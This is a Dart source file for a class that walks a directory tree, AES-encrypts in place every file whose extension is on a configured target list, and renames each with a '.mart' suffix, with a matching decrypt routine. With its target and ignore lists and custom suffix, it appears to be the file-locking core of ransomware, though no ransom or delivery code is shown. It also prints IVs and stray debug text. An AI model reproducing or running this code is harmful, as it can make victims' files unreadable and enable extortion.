import 'dart:io';

import 'package:encrypt/encrypt.dart';
import 'package:path/path.dart';

import '../util/config.dart';
import '../util/manipulate_data.dart';

class Crypto {
  String path;
  String key;
  late Directory _path;

  late Key _key;
  late IV _iv;
  late Encrypter _encrypter;

  Crypto(this.path, this.key) {
    _path = Directory(path);
    _key = Key.fromUtf8(key);
    _iv = IV.fromLength(16); // Generate a random IV during initialization
    _encrypter = Encrypter(AES(_key));
  }

  static Map<String, dynamic> _mapForResult() =>
      {'status': null, 'amountFiles': null, 'mode': null, 'response': null};

  Future<Map> encryptFile() async {
    Map result = _mapForResult();
    result['mode'] = 'encrypt';
    try {
      var amountFiles = 0;
      var files = await _discoveryFiles();
      files.forEach((file) {
        if (file.runtimeType.toString() == '_File') {
          var fileName = basename(file.path);
          var extension = fileName.split('.').last.toLowerCase();

          if (Config.extensionsToEncrypt.contains(extension) &&
              !Config.extensionsToIgnore.contains(extension)) {
            var content = _readFileAsync(file.path);
            var contentEncrypted = getEncryptContent(content);
            _writeFileSync(file.path, contentEncrypted)
                .then((value) => file.rename(file.path + '.mart'));
            amountFiles += 1;
          }
        }
      });
      result['amountFiles'] = amountFiles;
      result['status'] = true;
      return result;
    } catch (error) {
      print(error.toString());
      result['status'] = false;
      result['response'] = '${error.toString()}';
      return result;
    }
  }

  Future<Map> decryptFile() async {
    Map result = _mapForResult();
    result['mode'] = 'decrypt';
    try {
      var amountFiles = 0;
      var files = await _discoveryFiles();
      files.forEach((file) {
        if (file.runtimeType.toString() == '_File') {
          var fileName = basename(file.path);
          var extension = fileName.split('.').last.toLowerCase();

          if (extension == 'mart') {
            var contentEncrypted = _readFileAsync(file.path);

            var contentEncryptedToCheckBase64 = contentEncrypted.substring(24);

            if (ManipulateData.isBase64(contentEncryptedToCheckBase64)) {
              var contentDecrypted = getDecryptContent(contentEncrypted);

              _writeFileSync(file.path, contentDecrypted).then(
                  (value) => file.rename(file.path.replaceAll('.mart', '')));
              amountFiles += 1;
            } else {
              print("noooot basee 64");
            }
          }
        }
      });
      result['amountFiles'] = amountFiles;
      result['status'] = true;
      return result;
    } catch (error) {
      result['status'] = false;
      result['response'] = '${error.toString()}';
      return result;
    }
  }

  String getEncryptContent(String str) {
    IV iv = IV.fromSecureRandom(16);

    print("/////////////////////");
    print(iv.base64);
    print("**********");
    String encryptedContent = _encrypter.encrypt(str, iv: iv).base64;
    return iv.base64 + encryptedContent; // Include IV in the result
  }

  String getDecryptContent(String str) {
    if (str.length <= 24) {
      print("Invalid input string for decryption");
      return ""; // Handle the error case appropriately
    }
    String ivBase64 = str.substring(0, 24); // Extract IV from the input string
    IV iv = IV.fromBase64(ivBase64);
    String encryptedContent = str.substring(24);
    print("/////////////////////");
    print(iv.base64);
    print("**********");
    return _encrypter.decrypt64(encryptedContent, iv: iv);
  }

  Future<List> _discoveryFiles() async {
    var lister = _path.list(recursive: true, followLinks: false);
    List listFiles = await lister.toList();
    return listFiles;
  }

  String _readFileAsync(String path) {
    var file = File(path);
    var futureContent = file.readAsBytesSync();
    return ManipulateData.convertCharCodesToString(futureContent);
  }

  Future<File> _writeFileSync(String path, String content) async {
    var file = File(path);
    var bytes = ManipulateData.convertStringToCharCodes(content);
    return file.writeAsBytes(bytes);
  }
}
